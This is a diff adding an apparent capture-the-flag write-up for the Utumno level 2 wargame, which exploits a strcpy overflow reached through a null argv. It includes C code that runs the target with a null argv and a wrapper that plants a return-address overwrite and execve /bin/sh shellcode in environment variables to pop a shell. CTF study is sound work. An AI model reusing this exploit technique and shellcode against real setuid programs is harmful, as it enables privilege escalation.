@@ -30,5 +30,57 @@ to pass anything into a program with a null argv.
                          │_____________________________│
 
 
-                The gist of this level, is it 
+The gist of this level, is it checks that utumno2 was launched with a completely null argc,
+and if so it runs a strcpy on the memory location "argv+0x28".
+
+Passing a null argv is easy with execv/execve:
+		
+                                     nullargv.c
+                  ________________________________________________
+                 │                                                │
+                 │ #include <unistd.h>			 	  │	
+                 │                                                │
+                 │ int main(void) {                               │
+                 │ 	 char *empty[] = {NULL};                  │
+                 │	 execve("/utumno/utumno2", empty, empty); │
+                 │ }                                              │
+                 │________________________________________________│
+
+
+Just create a char* array with a single NULL element, and pass that in to argv.
+
+argv+0x28 ends up being inside of the environment variables, provided there are enough.
+Env vars also do not increase argc.
+
+As such, its easy to create some "AAAA" "BBBB" "CCCC" etc env vars to identify the location that strcpy will copy from.
+
+After that, we make that specific env variable long enough to overwrite the return address to our shellcode (also in the env vars), and let it run
+
+                                        serverwrapper.c
+       ____________________________________________________________________________
+      │                                                                            │                
+      │  #include <unistd.h>                                                       │                
+      │                                                                            │                
+      │  int main(void) {                                                          │                             
+      │          char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD",          │
+      │                                   "EEEE", "FFFF", "GGGG", "HHHH", "IIII",  │
+      │                                   "AAAABBBBCCCCDDDD\xbc\xdf\xff\xff",      │ //env var to override ret address
+      │                                   "KKKK", "LLLL", "MMMM", "NNNN", "OOOO",  │
+      │                                   "PPPP", "WANTTOUSETHIS",                 │
+      │                                                                            │
+      │          "SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89   │ //shellcode address
+      │           \xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68                             │
+      │          \x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89  │
+      │           \xe1\xb0\x0b\xcd\x80", 0};                                       │
+      │                                                                            │
+      │          char *argv[2] = {"./utumno2", 0};                                 │
+      │          char *empty[] = {NULL};                                           │
+      │          execve("/utumno/utumno2", empty, environment);                    │
+      │  }                                                                         │
+      │                                                                            │
+      │____________________________________________________________________________│
+
+Execute this, and you get a shell!
+
+
 
